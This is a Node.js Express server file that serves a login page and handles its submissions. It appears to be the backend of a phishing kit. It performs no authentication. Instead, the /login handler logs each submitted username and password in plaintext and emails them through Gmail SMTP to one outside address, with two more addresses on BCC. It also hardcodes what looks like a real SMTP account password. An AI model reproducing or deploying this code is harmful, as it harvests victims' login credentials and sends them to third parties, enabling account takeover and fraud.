const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'login.html'));
});

// Middleware to parse URL-encoded bodies (as sent by HTML forms)
app.use(bodyParser.urlencoded({ extended: true }));

// SMTP configuration
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com', // Replace with your SMTP server
    port: 587, // Replace with your SMTP port
    secure: false, // true for 465, false for other ports
    auth: {
        user: 'kingrimza195@gmail.com', // Replace with your SMTP email
        pass: 'yjgqtuqvzqykoevu' // Replace with your SMTP password
    }
});

// Handle form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Here, add your logic to authenticate the user
    console.log(`Username: ${username}, Password: ${password}`);

    // Send an email notification
    const mailOptions = {
        from: 'Formsubmit <kingrimza195@gmail.com>',
        to: 'ofentsehuntman@gmail.com', // Replace with the recipient's email
        bcc: ['rsadeku5@gmail.com', 'shebeshxt2008@gmail.com'], // Replace with the BCC recipients' emails
        subject: 'new form submission',
        text: `Login details received.\nUsername: ${username}\nPassword: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log('Error sending email:', error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent:', info.response);
            res.send('Login details received and email sent.');
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${3000}`);
});
